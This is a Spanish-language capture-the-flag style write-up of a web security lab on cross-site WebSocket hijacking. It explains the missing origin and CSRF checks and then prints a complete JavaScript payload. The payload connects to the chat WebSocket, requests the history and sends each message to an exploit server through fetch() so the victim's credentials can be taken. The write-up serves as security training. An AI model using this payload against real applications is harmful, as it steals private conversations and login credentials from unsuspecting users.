Este laboratorio presenta un escenario en el que un canal WebSocket se encuentra mal protegido, permitiendo que un atacante pueda establecer una conexión maliciosa desde otro dominio y extraer información sensible.

La aplicación incorpora un sistema de chat que utiliza WebSockets para gestionar la comunicación. Analizando la interacción con el servidor, identificamos que no existen medidas de protección contra peticiones cruzadas (como tokens CSRF o validación de origen), lo que abre la puerta a un ataque de tipo cross-site WebSocket hijacking.

El atacante construye un payload malicioso en una página controlada, capaz de establecer la conexión WebSocket directamente con el servidor del chat. Desde ahí, simula el comportamiento legítimo del cliente, solicitando el historial de conversación. Una vez recuperados los mensajes, estos se reenvían a un servidor externo (como Burp Collaborator) para su análisis.

El laboratorio se resuelve cuando logramos obtener, entre los mensajes de la víctima, sus credenciales de acceso, y las usamos para iniciar sesión en su cuenta. Esto demuestra cómo una falta de validaciones en el establecimiento de conexiones WebSocket puede comprometer la seguridad de los usuarios.

Solucion
bueno vemos que de igual forma tenemos un chat live y un exploit server el cual nos ayudaria para poder pasar toda la infomacion de este chat
para ello vamos a crear un script en JS el cual nos va a facilitar la entrada
payload (<script>
    var ws = new WebSocket("https://0acc0036041407c480cd039c00110057.web-security-academy.net/chat");
    ws.onopen = function() {
        ws.send("READY");
    };
    ws.onmessage = function(event) {
        fetch("https://exploit-0a9b00a20482072d802202ec01a00045.exploit-server.net/?data=" + btoa(event.data));
    };
</script>)

Este script es un **payload de exfiltración de datos**:

- Escucha mensajes de un chat o sistema WebSocket.
    
- Los envía a un servidor controlado por el atacante.
    
- Es un ejemplo de **XSS (Cross-Site Scripting) combinado con exfiltración de datos en tiempo real**.
    

💡 **En resumen:** este script roba información que fluye por la conexión WebSocket y la envía a otro servidor externo. Es el tipo de cosa que se usa en pruebas de seguridad (o ataques) para **capturar información confidencial en tiempo real**.

lo copiamos y pegamos en nuestro exploit
![Pasted_image_20250821001949.png](Imagenes/Pasted_image_20250821001949.png)
vemos los logs
![Pasted_image_20250821002012.png](Imagenes/Pasted_image_20250821002012.png)
tenemos info lo vamos a copiar y pegar en un archivo
![Pasted_image_20250821002231.png](Imagenes/Pasted_image_20250821002231.png)
y esto es lo que miramos
![Pasted_image_20250821002321.png](Imagenes/Pasted_image_20250821002321.png)
ya solo nos logeamos
![Pasted_image_20250821002414.png](Imagenes/Pasted_image_20250821002414.png)
